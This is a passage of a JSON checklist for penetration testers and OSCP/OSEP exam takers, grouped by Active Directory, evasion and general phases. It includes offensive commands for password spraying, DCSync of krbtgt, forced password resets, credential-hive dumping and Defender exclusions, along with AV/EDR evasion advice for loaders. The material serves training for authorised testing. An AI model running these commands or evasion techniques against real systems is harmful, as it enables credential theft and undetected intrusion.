     "why": "Access denied on one protocol is not access denied on the host — accounts commonly have exactly one working path.",
     "cmd": "impacket-wmiexec $DOMAIN/$USER:$PASS@$HOST"
    },
    {
     "text": "Is the account in Remote Management Users, Remote Desktop Users or Backup Operators rather than Administrators?",
     "why": "Those are login rights too, and each of them is a documented route to code execution or a SAM dump.",
     "cmd": ""
    },
    {
     "text": "Are you using Kerberos when NTLM is disabled — or NTLM when the host only accepts Kerberos by FQDN?",
     "why": "A whole class of 'the password is wrong' is NTLM being off; request a TGT and use -k with the FQDN.",
     "cmd": "impacket-getTGT $DOMAIN/$USER:$PASS && export KRB5CCNAME=$USER.ccache"
    },
    {
     "text": "Have you cracked roasted hashes with a rule set, and then tried the cracked password against OTHER accounts?",
     "why": "One cracked service account password is usually the domain's password pattern, and the pattern opens more doors than the account did.",
     "cmd": "hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule"
    },
    {
     "text": "Have you sprayed the obvious patterns — Season+Year, Company+123, username as password, previous password +1?",
     "why": "Lab and real domains both run on human password patterns; one mutation rule finds what a raw wordlist never will.",
     "cmd": "netexec smb $DC -u users.txt -p 'Autumn2026!' --continue-on-success"
    },
    {
     "text": "Do you hold an ACL over a user or group (ForceChangePassword, AddMember, GenericWrite) that you have avoided using because it felt too destructive?",
     "why": "That edge IS the intended path; in a lab or an authorised test it exists to be used — note it for the report and use it.",
     "cmd": "net rpc password $TARGETUSER 'NewPass123!' -U $DOMAIN/$USER%$PASS -S $DC"
    },
    {
     "text": "Can you coerce authentication and relay it? Have you checked SMB signing across the subnet first?",
     "why": "Coercion plus relay to LDAP or ADCS is a no-credential path to a privileged identity, and the signing check tells you in one command whether it is even possible.",
     "cmd": "netexec smb $SUBNET --gen-relay-list relay.txt"
    },
    {
     "text": "Do you have write access to a computer object? Then Shadow Credentials or RBCD gives you SYSTEM on it.",
     "why": "Machine object write rights get overlooked because they do not look like a privilege, and they are equivalent to local admin.",
     "cmd": "certipy shadow auto -u $USER@$DOMAIN -p $PASS -account $COMPUTER$"
    },
    {
     "text": "Is the host you are attacking actually Linux joined to the domain — SSH with domain credentials, a keytab, a leftover ccache?",
     "why": "Domain-joined Linux is a blind spot for AD tooling and frequently holds credentials in /tmp or /etc/krb5.keytab.",
     "cmd": ""
    },
    {
     "text": "Are there pre-created or must-change-password accounts whose password you can simply set?",
     "why": "An account flagged to change its password at next logon can be set by anyone who knows the current one — including a blank one.",
     "cmd": "impacket-changepasswd $DOMAIN/$USER@$DC -newpass 'Passw0rd!'"
    },
    {
     "text": "Clock skew, FQDN, and /etc/resolv.conf pointing at the DC — verified?",
     "why": "All three produce authentication errors that look like credential failures, and people rotate credentials instead of fixing DNS.",
     "cmd": "sudo ntpdate -u $DC"
    }
   ]
  },
  {
   "focus": "ad",
   "phase": "privesc-windows",
   "items": [
    {
     "text": "Have you dumped this host PROPERLY — SAM, LSA secrets, cached domain credentials, LSASS, DPAPI masterkeys and vault, plus any ccache or keytab?",
     "why": "LSA secrets holds service account passwords in cleartext and everyone stops at LSASS, which AV eats.",
     "cmd": "impacket-secretsdump -sam sam -system system -security security LOCAL"
    },
    {
     "text": "Who else has logged onto this box? Their DPAPI blobs and cached hashes are here even when they are not.",
     "why": "Cached domain credentials survive logoff and are the reason this host was worth taking.",
     "cmd": "dir C:\\Users"
    },
    {
     "text": "You are SYSTEM, so you ARE the machine account on the network. Have you used it?",
     "why": "The computer account often holds rights the user does not — ADCS enrolment, RBCD targets, share access — and nobody thinks to authenticate as it.",
     "cmd": ""
    },
    {
     "text": "Is there a live session or token of a more privileged user you can impersonate right now?",
     "why": "Token impersonation needs no cracking, no network, and no new credentials — and the session evaporates when they log off.",
     "cmd": "Get-Process -IncludeUserName | Sort-Object UserName"
    },
    {
     "text": "Is LAPS deployed? If not, the local Administrator hash almost certainly works on every other host.",
     "why": "Local admin password reuse is the fastest lateral path in existence and is ruled in or out in one command.",
     "cmd": "netexec smb $SUBNET -u Administrator -H $LOCALHASH --local-auth"
    },
    {
     "text": "Are there backup, deployment or monitoring agents here — Veeam, SCCM, a Jenkins agent, a SQL service?",
     "why": "Those products store domain-admin-equivalent credentials in recoverable form, and that is the intended path on most 'hard' AD boxes.",
     "cmd": ""
    },
    {
     "text": "Have you looked in every user profile for browser stores, KeePass databases, PuTTY/WinSCP sessions and saved RDP credentials?",
     "why": "Per-user credential stores are readable as SYSTEM and are skipped because the privesc phase 'already succeeded'.",
     "cmd": ""
    },
    {
     "text": "Did your dumping tool get blocked and return empty output rather than an error?",
     "why": "AV and LSA protection produce silent, clean-looking failures that read as 'no credentials on this host'.",
     "cmd": ""
    },
    {
     "text": "Have you requested a certificate as this machine or user for persistence and PKINIT?",
     "why": "A certificate survives password changes and gives you a stable identity for the rest of the engagement.",
     "cmd": "certipy req -u $USER@$DOMAIN -p $PASS -ca $CA -template User"
    },
    {
     "text": "Re-run BloodHound collection as this NEW identity.",
     "why": "Collection visibility is per-principal; the graph you pulled as the first user is not the graph this one can see.",
     "cmd": ""
    },
    {
     "text": "Stop at SYSTEM on this box and ask: what is the next IDENTITY, not the next privilege?",
     "why": "In AD the objective is always an account, not a host — people finish local privesc and then stall because they keep thinking vertically.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "ad",
   "phase": "lateral",
   "items": [
    {
     "text": "Have you re-run 'shortest path from owned' after marking the principals you acquired in the last hour?",
     "why": "The edge you need usually only appears once you own the third account — the graph changes every time you do.",
     "cmd": ""
    },
    {
     "text": "Do you already have replication rights and simply have not tried DCSync?",
     "why": "A surprising number of 'stuck before DA' moments end with discovering you had it two hours ago.",
     "cmd": "impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user krbtgt"
    },
    {
     "text": "Have you sprayed every NEW credential, hash and ticket across every host again?",
     "why": "The set of hosts where you are admin changes with each identity, and the spray is almost never repeated.",
     "cmd": "netexec smb $SUBNET -u $USER -H $HASH --continue-on-success"
    },
    {
     "text": "Have you actually USED the ACL edges you hold — GenericAll, WriteDACL, WriteOwner, AddSelf, GenericWrite to an SPN or logon script?",
     "why": "People avoid them because they modify the directory; in an authorised test that is exactly what they are for, and they are the intended path.",
     "cmd": ""
    },
    {
     "text": "Re-check ADCS with each new identity — enrolment and template rights are per-principal.",
     "why": "ESC1/ESC4 open up for the second account when they were closed for the first, and nobody re-runs the check.",
     "cmd": "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout"
    },
    {
     "text": "Do you own a host with unconstrained delegation? Then coerce the DC to authenticate to it.",
     "why": "That combination yields a DC TGT directly and is one of the few reliable single-step paths to the top.",
     "cmd": ""
    },
    {
     "text": "Can you write msDS-AllowedToActOnBehalfOfOtherIdentity on the target, and do you control any account with an SPN?",
     "why": "RBCD needs two ingredients and people give up when they only notice the first one; MachineAccountQuota supplies the second.",
     "cmd": ""
    },
    {
     "text": "Constrained delegation: have you tried S4U2Self/S4U2Proxy with an ALTERNATE service name on the same host?",
     "why": "The configured SPN restricts the service, not the host — swapping cifs for http or ldap on the same target is the classic unlock.",
     "cmd": "impacket-getST -spn cifs/$TARGET -impersonate Administrator $DOMAIN/$SVC:$PASS"
    },
    {
     "text": "Has a privileged user logged onto a box you own since you last dumped it?",
     "why": "Sessions rotate on a schedule; the second dump an hour later is the one that catches the admin.",
     "cmd": ""
    },
    {
     "text": "Is the objective actually on the DC, or on a member server you already control? Re-read the goal.",
     "why": "People chase Domain Admin out of habit when the flag, the data, or the engagement objective was three hosts back.",
     "cmd": ""
    },
    {
     "text": "Everything failing at once? Check your clock, your KRB5CCNAME pointing at an expired ticket, and whether your account got locked out by a spray.",
     "why": "A sudden total failure across every tool is environmental, not technical, and people re-run attacks for an hour before checking.",
     "cmd": "klist; netexec smb $DC -u $USER -p $PASS"
    },
    {
     "text": "Draw the matrix: identities you hold down one axis, hosts across the other. Which cells are empty?",
     "why": "Stuck-at-lateral is nearly always an untested cell in a small grid that becomes obvious the second you draw it.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "evasion",
   "phase": "foothold",
   "items": [
    {
     "text": "Was the payload blocked on disk, in memory, at execution, or on the network? Determine WHICH before changing anything.",
     "why": "People rewrite a loader for AMSI when the actual block was the egress proxy or the mark-of-the-web, and the symptom is identical.",
     "cmd": ""
    },
    {
     "text": "Is it AMSI (script content scanning) or the on-access file scanner? Test with a known-flagged benign string.",
     "why": "The fixes are completely different — in-memory patching versus never touching disk — and guessing wrong costs hours.",
     "cmd": ""
    },
    {
     "text": "Are you still running a public tool verbatim, with its author's strings and banners intact?",
     "why": "Offensive tooling is signatured on strings, not behaviour; renaming functions and stripping banners defeats a surprising amount of it.",
     "cmd": ""
    },
    {
     "text": "Are you writing to disk when you do not need to? In-memory execution, reflective load, or a living-off-the-land binary.",
     "why": "Most detections fire on file write and file execution; removing the artifact removes the detection entirely.",
     "cmd": ""
    },
    {
     "text": "Is application allow-listing actually in play — and have you checked the default rules' writable allowed directories?",
     "why": "The default AppLocker rule set permits execution from several writable paths under C:\\Windows, which is faster than any bypass technique.",
     "cmd": "Get-AppLockerPolicy -Effective -Xml"
    },
    {
     "text": "Are you in Constrained Language Mode? If so, stop writing PowerShell.",
     "why": "CLM silently breaks most PowerShell tradecraft and the errors look like syntax problems rather than a policy.",
     "cmd": "$ExecutionContext.SessionState.LanguageMode"
    },
    {
     "text": "Have you changed runtime entirely — PowerShell to C#, to a compiled binary, to a DLL sideload, to a shellcode loader?",
     "why": "Script-based detection is mature and binary-based detection is not; switching the layer beats obfuscating the same layer.",
     "cmd": ""
    },
    {
     "text": "Is the problem your C2 traffic rather than your payload — port, JA3, user agent, beacon interval, domain reputation?",
     "why": "Egress filtering and TLS inspection kill more shells than endpoint AV does, and the failure looks like a dead implant.",
     "cmd": ""
    },
    {
     "text": "Is your parent-child process chain the tell?",
     "why": "Office spawning PowerShell is behavioural, not signature-based — no amount of payload obfuscation helps.",
     "cmd": ""
    },
    {
     "text": "What product is actually installed, and in what mode? Stop guessing.",
     "why": "Defender-only and a real EDR need completely different approaches, and burning attempts to find out generates the telemetry you were avoiding.",
     "cmd": "Get-MpComputerStatus | Select AMRunningMode,RealTimeProtectionEnabled"
    },
    {
     "text": "Are you testing on the target instead of against a local copy of the same defences?",
     "why": "Every burned attempt is a sample submission and an alert; on an engagement that is how you get caught, on OSEP it is how you lose your window.",
     "cmd": ""
    },
    {
     "text": "Do the rules even require this? OSEP explicitly permits Metasploit Community, PowerShell Empire, Covenant, BloodHound and sqlmap; OSCP+ does not.",
     "why": "Optimising for stealth you do not need is the most common OSEP time-sink. Verified: https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide and https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "evasion",
   "phase": "privesc-windows",
   "items": [
    {
     "text": "Did winPEAS/Seatbelt actually complete, or did AV kill it mid-run and hand you a short, clean output?",
     "why": "Silent truncation is the number one cause of a missed Windows privesc — the tool 'ran', the findings never printed.",
     "cmd": ""
    },
    {
     "text": "Have you enumerated with native commands instead of a flagged binary?",
     "why": "sc, reg, icacls, wmic and schtasks find the same misconfigurations and look like ordinary administration.",
     "cmd": "sc.exe qc $SERVICE; icacls \"C:\\Program Files\\$APP\""
    },
    {
     "text": "Is the PRIMITIVE blocked, or just your implementation of it?",
     "why": "A potato binary dying to EDR does not invalidate SeImpersonate — a different named-pipe or COM variant of the same technique usually walks straight through.",
     "cmd": ""
    },
    {
     "text": "Do you already have the rights to add a Defender exclusion instead of evading it?",
     "why": "An elevated-equivalent token can often just exclude a path, and people spend hours on evasion when configuration was available.",
     "cmd": "Add-MpPreference -ExclusionPath C:\\Windows\\Tasks"
    },
    {
     "text": "Is your dying process the child, not the payload? Change how you spawn it.",
     "why": "Behavioural rules fire on process lineage; the same payload launched from a different parent survives.",
     "cmd": ""
    },
    {
     "text": "Are you running from a monitored or blocked directory?",
     "why": "Path-based rules are common and moving the same binary to an allowed directory changes the outcome with no tooling change.",
     "cmd": ""
    },
    {
     "text": "LSASS protected or watched? Use a different credential source — SAM+SYSTEM via SeBackup, DPAPI, cached credentials, or a dump via a signed utility.",
     "why": "There are five credential sources on a Windows host and people only try the loudest one.",
     "cmd": "reg save HKLM\\SAM sam.hive & reg save HKLM\\SYSTEM system.hive"
    },
    {
     "text": "Are your script-based checks dying to AMSI specifically?",
     "why": "If the script never executes, its findings never existed — and the error often just looks like a failed script.",
     "cmd": ""
    },
    {
     "text": "Have you checked the misconfigurations that need no tooling at all — writable service paths, scheduled task scripts, plaintext credentials in files?",
     "why": "Most 'evasion' problems evaporate when the actual path is reading a file that any user can read.",
     "cmd": "findstr /si password *.xml *.config *.txt 2>nul"
    },
    {
     "text": "Which products are present, in what mode, with which drivers loaded?",
     "why": "Tailoring to the actual product takes ten minutes; guessing generates alerts and teaches you nothing.",
     "cmd": "driverquery /v | findstr /i \"crowd carbon sentinel cylance defender elastic\""
    },
    {
     "text": "Is there a legitimate GUI, RDP or management path that would be completely unremarkable?",
     "why": "The quietest escalation is frequently doing what the administrator does, with the tool the administrator uses.",
     "cmd": ""
    },
    {
     "text": "What is your noise budget? Each failed attempt is an alert — is it time to enumerate more rather than try more?",
     "why": "On a monitored engagement, attempt count is the detection; slowing down is a technique, not a failure.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "evasion",
   "phase": "lateral",
   "items": [
    {
     "text": "Are you using the loudest possible execution method when a quieter one would work?",
     "why": "Service-creation exec is the most heavily alerted lateral technique there is; WMI, WinRM, DCOM and scheduled tasks are ordinary administration.",
     "cmd": ""
    },
    {
     "text": "Are you moving with an identity that BELONGS on the destination host?",
     "why": "Anomalous account-to-host pairs are the primary lateral detection; the account that already logs in there is effectively invisible.",
     "cmd": ""
    },
    {
     "text": "Have you checked which hosts this account already touches, so your movement matches its history?",
     "why": "Session and logon data tells you the account's normal blast radius, and staying inside it is free stealth.",
     "cmd": ""
    },
    {
     "text": "Pass-the-ticket rather than pass-the-hash — does this environment normally use Kerberos?",
     "why": "NTLM authentication to a host that always uses Kerberos is a single clean detection rule, and switching costs nothing.",
     "cmd": "export KRB5CCNAME=$TICKET.ccache && impacket-wmiexec -k -no-pass $DOMAIN/$USER@$FQDN"
    },
    {
     "text": "Are you dropping a binary where a native or already-installed tool would do?",
     "why": "The file write is usually the detected event, not the action it performs.",
     "cmd": ""
    },
    {
     "text": "Is your spray generating a failed-logon spike or locking accounts out?",
     "why": "Velocity-based alerting catches spraying long before any single authentication looks wrong — target precisely instead.",
     "cmd": ""
    },
    {
     "text": "Is the tunnel itself the artifact — odd port, long-lived connection, high volume, off-hours?",
     "why": "Network anomaly detection sees the shape of your channel even when it cannot see inside it.",
     "cmd": ""
    },
    {
     "text": "Are you pivoting through a route that no one normally uses?",
     "why": "Host A talking to host B for the first time ever is a detection; prefer the host that legitimately talks to the target.",
     "cmd": ""
    },
    {
     "text": "Have you tried doing nothing for an hour and coming back?",
     "why": "Many detections are rate- and burst-based; patience defeats them in a way no tooling can.",
     "cmd": ""
    },
    {
     "text": "Are you cleaning up as you go — services, files, scheduled tasks, registry keys — and recording each artifact?",
     "why": "Left-behind artifacts are a finding against you on a real engagement, and the report must list every one you created.",
     "cmd": ""
    },
    {
     "text": "Re-read the rules of engagement. Do you actually need this stealth?",
     "why": "Optimising for an adversary simulation on a straight penetration test wastes the whole window.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "evasion",
   "phase": "exploit-dev",
   "items": [
    {
     "text": "Is the detection on the file at rest, or on the memory at the moment of injection?",
     "why": "Encrypting the payload fixes static detection only; a memory scan needs a completely different answer, and people apply the wrong fix repeatedly.",
     "cmd": ""
    },
    {
     "text": "Have you changed the LOADER rather than the shellcode?",
     "why": "The API sequence — VirtualAlloc RWX, WriteProcessMemory, CreateThread — is what is signatured; the payload bytes usually are not.",
     "cmd": ""
    },
    {
     "text": "Are you still allocating RWX?",
     "why": "Private RWX memory is the single highest-signal artifact on a Windows host; allocate RW, write, then flip to RX.",
     "cmd": ""
    },
    {
     "text": "Are your imports the tell? Resolve APIs dynamically or by hash, or go via syscalls.",
     "why": "A static import table naming the injection APIs is detected before your code ever runs.",
     "cmd": ""
    },
    {
     "text": "Is a userland hook breaking your call, or did the call succeed and your shellcode is simply wrong? Debug with a benign payload first.",
     "why": "People rewrite unhooking logic for hours when the actual problem was a mis-generated payload or a wrong architecture.",
     "cmd": ""
    },
    {
     "text": "Did you test offline, against the actual product at the actual patch level, with cloud submission disabled?",
     "why": "Uploading your loader to a vendor's cloud burns it permanently, and you will not know why it stops working next week.",
     "cmd": ""
    },
    {
     "text": "Does it die instantly in a scan but run fine on a real host?",
     "why": "That is emulation, not detection — but be aware that the sandbox check you add is itself a well-known signature.",
     "cmd": ""
    },
    {
     "text": "Does your binary look like a packed blob — high entropy, no imports, no resources?",
     "why": "File characteristics are scored before any content matching; a plain-looking binary with the payload in a resource scores better than a good crypter.",
     "cmd": ""
    },
    {
     "text": "Is the block actually SmartScreen or mark-of-the-web rather than AV?",
     "why": "Reputation-based blocking is fixed by delivery and container format, and no amount of payload engineering touches it.",
     "cmd": ""
    },
    {
     "text": "Memory corruption: are your gadgets from a module that is rebased, patched or ASLR'd differently on the target build?",
     "why": "Reusing yesterday's offsets against a different patch level is the most common silent failure in exploit development.",
     "cmd": ""
    },
    {
     "text": "Did you verify bad characters against memory one round at a time, rather than assuming the usual set?",
     "why": "The bad-char set is a property of the injection path, not the protocol, and a wrong assumption corrupts the payload invisibly.",
     "cmd": ""
    },
    {
     "text": "Does the whole thing run unattended from a clean snapshot, first try?",
     "why": "Prove it before you need it — an exploit that needs a manual nudge is an exploit that fails when it counts.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "mixed",
   "phase": "recon",
   "items": [
    {
     "text": "Re-read the objective. What are you actually being asked to achieve, and does your current activity move toward it?",
     "why": "Hours vanish into an interesting rabbit hole that is neither in scope nor worth points.",
     "cmd": ""
    },
    {
     "text": "Re-read your own notes from the first hour, top to bottom, without skimming.",
     "why": "A third of the time the answer is already written down in your own words and you stopped seeing it.",
     "cmd": ""
    },
    {
     "text": "List the things you 'tried and they failed'. Pick the two most important and PROVE they failed.",
     "why": "'I tried that' is usually 'I tried that once, badly, with a typo or the wrong flag'.",
     "cmd": ""
    },
    {
     "text": "Have you covered everything in scope breadth-first, or only the first host that looked interesting?",
     "why": "A ten-minute pass over every target beats three hours on one port, and it reorders your priorities immediately.",
     "cmd": ""
    },
    {
     "text": "Is your scan data stale? Has the machine been reverted, restarted, or changed since you collected it?",
     "why": "A service that starts late, or a host someone reset, silently invalidates everything you are reasoning from.",
     "cmd": ""
    },
    {
     "text": "Write down the three most likely paths in, ranked. Are you working on number one?",
     "why": "Making the ranking explicit exposes that you are working on number four because it was the most fun.",
     "cmd": ""
    },
    {
     "text": "Are your tools actually working? Prove the toolchain end to end against something you know is vulnerable.",
     "why": "A broken proxy, an expired VPN route or a mis-set interface produces hours of confident, meaningless negative results.",
     "cmd": ""
    },
    {
     "text": "Are you saving all output to files, or re-running scans because you lost the last one?",
     "why": "Re-running a full scan costs twenty minutes you will need later; fix it now rather than at hour twenty.",
     "cmd": "nmap ... -oA scans/$IP-full"
    },
    {
     "text": "How long have you been on this target, and what does the next hour here cost you elsewhere?",
     "why": "Sunk cost is the dominant failure mode in timed exams, and the clock does not care how close you feel.",
     "cmd": ""
    },
    {
     "text": "Take the ten-minute break. Away from the screen.",
     "why": "At this point the bottleneck is attention, not information — and every experienced tester knows this and still refuses to do it.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "mixed",
   "phase": "enumeration",
   "items": [
    {
     "text": "List every artefact you have collected — usernames, passwords, hostnames, versions, paths, emails. Have you used each one against everything else?",
     "why": "The unlock is almost always an incomplete cross-product of things you already own, not a new discovery.",
     "cmd": ""
    },
    {
     "text": "What is the single weirdest thing you have seen on this target? Go back to it.",
     "why": "Authors and admins both leave things out of place; 'that's odd' was your instinct being right and you filed it away.",
     "cmd": ""
    },
    {
     "text": "Have you enumerated as EACH identity you hold — anonymous, guest, user A, user B?",
     "why": "The visible surface is per-identity, and the second pass routinely shows a share, a route or a menu the first could not.",
     "cmd": ""
    },
    {
     "text": "What have you not enumerated because it looked boring?",
     "why": "'Boring' is your bias, not the target's; the printer, the mail server and the legacy port are where the path is.",
     "cmd": ""
    },
    {
     "text": "Have you re-run the initial scan with the full port range and UDP, after everything you have learned?",
     "why": "The first scan was run before you knew what this environment was — it asked the wrong questions.",
     "cmd": ""
    },
    {
     "text": "Is there vendor documentation you have not read — default credentials, default paths, the admin guide?",
     "why": "Reading the manual beats guessing, and default paths and credentials are printed in it.",
     "cmd": ""
    },
    {
     "text": "Are you keeping a 'tried and failed' list? If not, start one now.",
     "why": "Without it you are re-trying the same three things every ninety minutes and calling it persistence.",
     "cmd": ""
    },
    {
     "text": "Has anything changed since your last pass — a reset, a restart, another operator's activity?",
     "why": "Negative results have a shelf life and yours have expired.",
     "cmd": ""
    },
    {
     "text": "Ask what the machine is FOR, then attack that.",
     "why": "The intended path nearly always matches the system's purpose rather than a stray CVE.",
     "cmd": ""
    },
    {
     "text": "Twenty more minutes here, then switch targets and come back with fresh eyes.",
     "why": "Rotation is a technique, not an admission of defeat, and it is the highest-yield move available at this point.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "mixed",
   "phase": "foothold",
   "items": [
    {
     "text": "Complete the credential matrix: every credential you own, against every service, for every username, including username-as-password.",
     "why": "Credential reuse is the most common foothold in existence and the matrix is almost never actually finished.",
     "cmd": ""
    },
    {
     "text": "Prove your callback path works with a trivial test before debugging the exploit.",
     "why": "Blocked egress is indistinguishable from a broken exploit, and one curl settles which you are fighting.",
     "cmd": ""
    },
    {
     "text": "Did you read the exploit's source and fix its hardcoded assumptions — target, port, path, offsets, version check?",
     "why": "Most public PoCs are written for one specific host and fail loudly on everything else.",
     "cmd": ""
    },
    {
     "text": "Are you attacking the newest finding instead of the most likely one?",
     "why": "Novelty bias: the shiniest vulnerability gets your attention, the boring service is the intended path.",
     "cmd": ""
    },
    {
     "text": "Go back to the thing you dismissed as 'probably nothing'.",
     "why": "You dismissed it while mid-scan, without testing it, and you have not thought about it since.",
     "cmd": ""
    },
    {
     "text": "Is the target in a bad state from your own attempts? Revert and re-verify one known-good step.",
     "why": "After a crashed service every subsequent negative result is noise, and people test against a broken target for hours.",
     "cmd": ""
    },
    {
     "text": "Re-read the full error message, then search for the exact string.",
     "why": "The error usually names the precondition you are missing; skimming it is why you are still here.",
     "cmd": ""
    },
    {
     "text": "Try the same attack a different way — different payload language, port, encoding, protocol, client.",
     "why": "The technique is often right and the delivery is wrong, and delivery has half a dozen cheap variations.",
     "cmd": ""
    },
    {
     "text": "Switch targets for an hour, then come back and re-read your notes from the top.",
     "why": "At hour ten context-switching outperforms every tool, and it is treated as giving up rather than as method.",
     "cmd": ""
    },
    {
     "text": "If you were the author, what would you want the student to learn here?",
     "why": "Lab targets teach one specific thing; naming it out loud usually names the path.",
     "cmd": ""
    },
    {
     "text": "Check the rules before reaching for an automated tool — OSCP+ limits Metasploit to a single target and prohibits sqlmap and similar auto-exploitation tools.",
     "why": "Using the wrong tool can invalidate an otherwise successful compromise. Verified: https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "mixed",
   "phase": "privesc-linux",
   "items": [
    {
     "text": "Did you re-run everything as the user you just became?",
     "why": "It is the single most common miss on Linux and it takes two minutes.",
     "cmd": "sudo -l; id; ls -la ~; crontab -l"
    },
    {
     "text": "Did you READ the automated tool's output, or scroll past it? Re-read the highlighted lines and verify each one by hand.",
     "why": "The finding was on your screen; tools flag it, humans skim it, and the answer scrolls away.",
     "cmd": ""
    },
    {
     "text": "Have you looked at the box like a human — every home directory, /opt, /srv, /var/backups, /tmp, and anything the distro did not install?",
     "why": "Automated tools compare against known-bad lists; whoever built this target planted something novel by definition.",
     "cmd": "ls -la /opt /srv /var/backups /home/*"
    },
    {
     "text": "Try every password you already hold with su, for every user on the box.",
     "why": "Reuse to another account, and to root, is the most common Linux escalation and costs seconds to rule out.",
     "cmd": ""
    },
    {
     "text": "sudo -l, groups, capabilities, SUID — but this time read the FLAGS and check GTFOBins for the exact invocation.",
     "why": "The binary name alone tells you nothing; the sudo flags and env_keep line are where the escalation actually lives.",
     "cmd": "getcap -r / 2>/dev/null; find / -perm -4000 -type f 2>/dev/null"
    },
    {
     "text": "Watch the machine for two minutes instead of reading crontab.",
     "why": "pspy shows the root jobs and their full command lines that an unprivileged crontab listing cannot show you at all.",
     "cmd": "./pspy64"
    },
    {
     "text": "What is listening on localhost that you can now reach?",
     "why": "Internal services are the usual reason a foothold exists; the external ports were never the point.",
     "cmd": "ss -lntup"
    },
    {
     "text": "Are you in a container or a restricted shell? Then root is not the objective.",
     "why": "Half of 'privesc is impossible' is an unnoticed boundary where the real goal is escape or reaching the host.",
     "cmd": "cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null"
    },
    {
     "text": "Is your shell too broken to see the truth — no TTY, no PATH, no environment?",
     "why": "Interactive commands fail silently in a dumb shell and you conclude the credential or technique was wrong.",
     "cmd": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
    },
    {
     "text": "Write down what you have actually ruled out. You are probably re-checking the same three things.",
     "why": "Without an explicit list, privesc becomes a loop of the same checks at increasing speed and decreasing care.",
     "cmd": ""
    },
    {
     "text": "Kernel exploits last, only on an exact version match, and expect a revert.",
     "why": "It is the biggest time sink and the least likely intended path on anything built this decade.",
     "cmd": "uname -a; cat /etc/os-release"
    }
   ]
  },
  {
   "focus": "mixed",
   "phase": "privesc-windows",
   "items": [
    {
     "text": "Check your groups before hunting an exploit — are you already an administrator in a medium-integrity token?",
     "why": "People escalate an account that is already privileged; the wall is UAC, not permissions.",
     "cmd": "whoami /groups | findstr /i S-1-5-32-544"
    },
    {
     "text": "Did your enumeration tool actually run, or did AV eat it and leave you a clean, short report?",
     "why": "Silent truncation is the number one cause of missed Windows escalation — verify with two native commands.",
     "cmd": "whoami /priv; sc query state= all | find \"SERVICE_NAME\" /c"
    },
    {
     "text": "whoami /priv — every line, including the disabled ones.",
     "why": "SeImpersonate shows as Disabled and is still immediately usable; that single misreading costs people entire boxes.",
     "cmd": "whoami /priv"
    },
    {
     "text": "Have you read the PowerShell history, credential manager and saved sessions for every profile on disk?",
     "why": "Plaintext credentials sit in those three places constantly, and no automated score shouts loudly enough about them.",
     "cmd": "cmdkey /list"
    },
    {
     "text": "What third-party software is installed that Microsoft did not write?",
     "why": "On Windows, non-Microsoft software is the intended path far more often than a missing patch.",
     "cmd": "dir \"C:\\Program Files\" \"C:\\Program Files (x86)\""
    },
    {
     "text": "Have you looked at FILES — Desktops, Documents, shares, and .xml/.bak/.kdbx/.ps1/.config on every drive?",
     "why": "The password is in something a human left behind, and privesc tools do not score 'notes.txt' as interesting.",
     "cmd": "findstr /si password *.xml *.ini *.txt *.config 2>nul"
    },
    {
     "text": "Service PERMISSIONS, not just unquoted paths. Plus scheduled tasks and writable directories in a service's path.",
     "why": "Everyone checks unquoted paths; the reconfigurable service ACL is what actually wins.",
     "cmd": "accesschk.exe /accepteula -uwcqv \"Users\" *"
    },
    {
     "text": "Is there another LOCAL user to become before SYSTEM?",
     "why": "The horizontal step is frequently the intended one, and people only look upward.",
     "cmd": "net user; dir C:\\Users"
    },
    {
     "text": "Is this host domain-joined? Then the answer may not be local at all.",
     "why": "On a domain member, dumping credentials and moving beats grinding for local SYSTEM that nothing requires.",
     "cmd": "systeminfo | findstr /i domain"
    },
    {
     "text": "Both HKLM and HKCU checked for AlwaysInstallElevated, autologon and stored credentials?",
     "why": "Half-checks produce false negatives on settings that only matter when both hives agree.",
     "cmd": ""
    },
    {
     "text": "Re-run enumeration as the new identity after every change of context.",
     "why": "Privileges, tokens, mapped drives and readable files are all per-user; the second pass is where it appears.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "mixed",
   "phase": "lateral",
   "items": [
    {
     "text": "Draw the map: hosts down one axis, identities you hold across the other. Which cells have you never tested?",
     "why": "Stuck-at-lateral is almost always an empty cell in a small grid, and it becomes obvious the moment it is drawn.",
     "cmd": ""
    },
    {
     "text": "Have you dumped everything from every host you own, or only from the first one?",
     "why": "Hosts two and three get taken and never looted, and the credential you need is sitting on one of them.",
     "cmd": ""
    },
    {
     "text": "Re-spray every credential across every host now that you have more of them.",
     "why": "The answer changes with every new credential, and the spray is treated as a one-time step.",
     "cmd": ""
    },
    {
     "text": "Re-run discovery FROM inside — ARP, routes, hosts file, known_hosts, internal DNS, listening ports.",
     "why": "The next hop is usually already recorded on the box you own, and external scanning will never show it.",
     "cmd": "arp -a; cat /etc/hosts ~/.ssh/known_hosts 2>/dev/null"
    },
    {
     "text": "Is your pivot actually working? Test one known-good TCP connection through it.",
     "why": "A broken tunnel and a firewalled target are indistinguishable from the attacker's side.",
     "cmd": ""
    },
    {
     "text": "Have you gone back to the host you wrote off before you had credentials?",
     "why": "'Nothing on it' was an unauthenticated judgement about a machine you can now log into.",
     "cmd": ""
    },
    {
     "text": "Has time passed? Has anyone logged in since your last dump?",
     "why": "Privileged sessions appear on a schedule; the second dump an hour later is the one that catches them.",
     "cmd": ""
    },
    {
     "text": "Does the objective actually require this hop? Re-read the goal.",
     "why": "People chase the domain controller out of habit when the flag or the engagement objective was two hosts back.",
     "cmd": ""
    },
    {
     "text": "Are your credentials still valid at all — expired ticket, changed password, locked-out account?",
     "why": "A sudden total failure across every tool is environmental, and people re-run attacks for an hour before checking.",
     "cmd": "klist"
    },
    {
     "text": "Are you documenting the chain as you move?",
